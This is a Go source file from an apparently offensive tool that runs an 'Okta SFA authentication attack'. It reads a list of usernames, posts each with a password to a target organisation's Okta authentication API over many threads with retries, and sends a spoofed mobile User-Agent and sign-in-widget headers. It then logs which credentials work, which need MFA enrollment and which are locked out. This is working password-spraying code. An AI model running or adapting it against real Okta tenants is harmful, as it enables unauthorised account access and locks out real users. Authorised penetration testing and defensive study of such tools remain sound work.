package mfa

import (
	"fmt"
	"strings"
	"time"

	"dauthi/utils"
)

type mdma struct {
	opts utils.ChargeOpts
	logr *utils.Logger
	cycle
}

type cycle struct {
	buff   *chan bool
	block  *chan bool
	length int
	api    *utils.API
}

const (
	Usage = `
  MFA Options:
    -a                     User-Agent for request [default: Agent/20.08.0.23/Android/11]
	`

	// Methods are available tool methods
	Methods = `
  MFA Methods:
    auth-okta              Okta SFA authentication attack
	`

	oktaAuthAPI = `https://%s.okta.com/api/v1/authn`

	oktaAuthPOST = `{"options": {"warnBeforePasswordExpired": true, "multiOptionalFactorEnroll": true}, ` +
		`"subdomain": "%s", "username": "%s", "password": "%s"}`
)

// Init mdma with default values and return obj
func Init(o utils.ChargeOpts) *mdma {
	if o.Agent == "" {
		o.Agent = "Agent/20.08.0.23/Android/11"
	}
	log := utils.NewLogger("multi-factor")

	return &mdma{
		opts: o,
		logr: log,
		cycle: cycle{
			api: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

// clone() copies an *mdma for process threading
func (m *mdma) clone() *mdma {
	clone := Init(m.opts) // assign target
	clone.cycle.block = m.cycle.block
	clone.cycle.buff = m.cycle.buff

	return clone
}

// Wrapper to parse JSON/XML objects
func (m *mdma) parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.cycle.api.Resp.ParseJSON(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.cycle.api.Resp.ParseXML(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

func (m *mdma) auth() {
	var file []byte
	var err error

	if m.opts.File != "" {
		file, err = utils.ReadFile(m.opts.File)
		if err != nil {
			m.logr.Fatalf([]interface{}{m.opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.opts.Threads)
	buff := make(chan bool, len(lines))
	m.cycle.block = &block
	m.cycle.buff = &buff
	m.cycle.length = len(lines)

	m.logr.Infof([]interface{}{m.opts.Method}, "threading %d values across %d threads", m.cycle.length, m.opts.Threads)

	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.cycle.buff <- false
			continue
		}

		target := m.clone() // assign target

		if line == "" {
			line = target.opts.UserName
		} else {
			target.opts.UserName = line
		}

		switch m.opts.Method {
		case "auth-okta":
			target.cycle.api.Name = target.opts.Method
			target.cycle.api.URL = fmt.Sprintf(oktaAuthAPI, target.opts.Endpoint)
			target.cycle.api.Data = fmt.Sprintf(oktaAuthPOST, target.opts.Endpoint, target.opts.UserName, target.opts.Password)
			target.cycle.api.Method = `POST`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"X-Requested-With":           []string{"XMLHttpRequest"},
					"X-Okta-User-Agent-Extended": []string{"okta-signin-widget-5.14.1"},
					"User-Agent":                 []string{target.opts.Agent},
					"Accept":                     []string{"application/json"},
					"Content-Type":               []string{"application/json"}}}

		default:
			m.logr.Failf([]interface{}{m.opts.Method}, "Unknown Method Called")
		}
		target.thread()
	}

	for i := 0; i < m.cycle.length; i++ {
		<-*m.cycle.buff
	}
	close(*m.cycle.block)
	close(*m.cycle.buff)
}

// thread represents the threading process to loop multiple requests
func (m *mdma) thread() {
	*m.cycle.block <- true
	go func() {
		m.cycle.api.WebCall()

		if m.cycle.api.Resp.Status == 0 {
			if m.opts.Miss < m.opts.Retry {
				m.opts.Miss++
				m.logr.Infof([]interface{}{m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Retrying Request")
				<-*m.cycle.block
				m.thread()
				return
			}
			m.logr.Failf([]interface{}{m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Null Server Response")
		}
		m.validate()

		// Sleep interval through thread loop
		time.Sleep(time.Duration(m.opts.Sleep) * time.Second)
		<-*m.cycle.block
		*m.cycle.buff <- true
	}()
}

func (m *mdma) validate() {
	switch m.opts.Method {
	case "auth-okta":
		var check struct {
			Status string `json:"status"`
			Error  string `json:"errorSummary"`
		}
		if m.parser(&check, "json") {
			return
		}

		if check.Status != "" {
			if check.Status == "MFA_ENROLL" {
				m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Successful - MFA REQUIRED")
			} else if check.Status == "LOCKED_OUT" {
				m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Failed - Account Locked")
			} else {
				m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Successful")
			}
		} else {
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password}, "%s", check.Error)
		}
	}
}

// Call represents the switch function for activating all class methods
func (m *mdma) Call() {
	switch m.opts.Method {
	case "auth-okta":
		if m.opts.Email == "" && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
			return
		}
		m.opts.UserName = m.opts.Email
		m.auth()

	default:
		m.logr.StdOut(Methods)
		m.logr.Fatalf(nil, "Invalid Method Selected %v", m.opts.Method)
	}
}
